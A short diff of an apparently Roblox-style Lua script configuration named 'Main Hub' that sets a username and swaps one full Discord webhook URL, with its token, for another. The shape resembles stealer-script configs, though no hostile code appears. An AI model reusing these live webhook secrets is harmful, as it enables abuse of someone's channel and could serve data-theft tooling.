@@ -1,5 +1,5 @@
 Username = "igorus15"
-WebHook = "https://discord.com/api/webhooks/1073665943756095529/2RO8mKxe49L8oyS0iNCty29Gg4bXbUI8bWUphlgpCl-AKOl5IbzRVUI3_DEOv1OLDIo4"
+WebHook = "https://discord.com/api/webhooks/1074265229418057789/_s5BgluhdM_vV0zNf4xrgzImDMKORyUwL-1bXbhoRsAU5U2r3gcfWWNrxmkdaYfpBSbC"
 
 _G.CustomScriptName = "Main Hub"
 _G.Text1 = "Script Loaded..."
